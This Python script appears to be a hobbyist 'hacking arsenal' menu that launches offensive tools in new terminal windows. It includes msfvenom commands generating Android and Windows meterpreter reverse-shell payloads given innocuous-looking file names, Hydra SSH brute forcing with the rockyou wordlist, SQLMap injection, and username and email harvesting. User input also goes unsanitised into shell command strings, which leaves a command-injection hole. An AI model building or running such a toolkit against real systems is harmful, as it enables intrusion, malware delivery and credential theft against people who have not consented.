import os
import time
from termcolor import colored

def clear():
    os.system('clear')

def run_cmd(cmd, title):
    # وظيفة لفتح نافذة تيرمينال جديدة لكل أداة
    print(colored(f"[+] Starting {title} in a new window...", "green"))
    os.system(f"qterminal -e 'bash -c \"{cmd}; echo; echo Press Enter to close...; read\"' &")

def banner():
    print(colored("          .  .  .  .", "yellow"))
    print(colored("      _  👑 Body 👑  _", "red"))
    print(colored("    --- [ B7 GOD MODE - 19 TOOLS ] ---", "cyan"))
    print(colored("    --- [ FULL CYBER ARSENAL 2025 ] ---", "white"))

def menu():
    print(colored("\n--- [ 🛡️ Vulnerability & Scanning ] ---", "blue"))
    print("[1] Quick Port Scan (Nmap)     [2] Full Vuln Scan (NSE)")
    print("[3] Service Version Detect     [4] OS Fingerprinting")
    
    print(colored("\n--- [ 🚀 Web & Database Attacks ] ---", "red"))
    print("[5] SQL Injection (SQLMap)     [6] Admin Panel Finder")
    print("[7] Directory Buster (Dirb)    [8] XSS Vulnerability Scan")
    print("[9] Content Discovery (Nikto)  [10] Subdomain Finder")
    
    print(colored("\n--- [ 🕵️ OSINT & Info Gathering ] ---", "green"))
    print("[11] Username Search (Sherlock) [12] Domain Emails (Harvester)")
    print("[13] IP Geolocation Trace      [14] Whois Domain Lookup")
    
    print(colored("\n--- [ 📱 Exploitation & Payloads ] ---", "magenta"))
    print("[15] Metasploit Framework      [16] Android APK Payload")
    print("[17] Windows EXE Payload       [18] SSH Brute Force (Hydra)")
    
    print(colored("\n--- [ 🔒 Privacy & Fun ] ---", "yellow"))
    print("[19] Enable Tor Stealth Mode   [0] Exit")

def main():
    while True:
        clear()
        banner()
        menu()
        choice = input(colored("\nB7-Arsenal > ", "cyan"))

        if choice == '1':
            ip = input("Target IP: "); run_cmd(f"nmap {ip}", "Quick Scan")
        elif choice == '2':
            ip = input("Target IP: "); run_cmd(f"nmap --script vuln {ip}", "Vuln Scan")
        elif choice == '3':
            ip = input("Target IP: "); run_cmd(f"nmap -sV {ip}", "Service Detect")
        elif choice == '4':
            ip = input("Target IP: "); run_cmd(f"sudo nmap -O {ip}", "OS Detect")
        elif choice == '5':
            url = input("Target URL: "); run_cmd(f"sqlmap -u {url} --batch --random-agent", "SQLMap")
        elif choice == '6':
            url = input("Target URL: "); run_cmd(f"python3 admin_finder.py {url}", "Admin Finder")
        elif choice == '7':
            url = input("Target URL: "); run_cmd(f"dirb {url}", "Dirb")
        elif choice == '8':
            url = input("Target URL: "); run_cmd(f"xsser --url {url}", "XSS Scan")
        elif choice == '9':
            url = input("Target URL: "); run_cmd(f"nikto -h {url}", "Nikto")
        elif choice == '10':
            dom = input("Domain: "); run_cmd(f"sublist3r -d {dom}", "Subdomain Finder")
        elif choice == '11':
            user = input("Username: "); run_cmd(f"sherlock {user}", "Sherlock")
        elif choice == '12':
            dom = input("Domain: "); run_cmd(f"theHarvester -d {dom} -l 500 -b google", "TheHarvester")
        elif choice == '13':
            ip = input("IP Address: "); run_cmd(f"curl http://ip-api.com/line/{ip}", "IP Tracker")
        elif choice == '14':
            dom = input("Domain: "); run_cmd(f"whois {dom}", "Whois")
        elif choice == '15':
            run_cmd("msfconsole", "Metasploit")
        elif choice == '16':
            ip = input("LHOST: "); port = input("LPORT: "); run_cmd(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o B7_hack.apk", "Android Payload")
        elif choice == '17':
            ip = input("LHOST: "); port = input("LPORT: "); run_cmd(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o B7_setup.exe", "Windows Payload")
        elif choice == '18':
            ip = input("Target IP: "); user = input("Username: "); run_cmd(f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt {ip} ssh", "Hydra Brute Force")
        elif choice == '19':
            os.system("sudo service tor restart"); print(colored("[+] Tor Active!", "green")); time.sleep(2)
        elif choice == '0':
            break

if __name__ == "__main__":
    main()
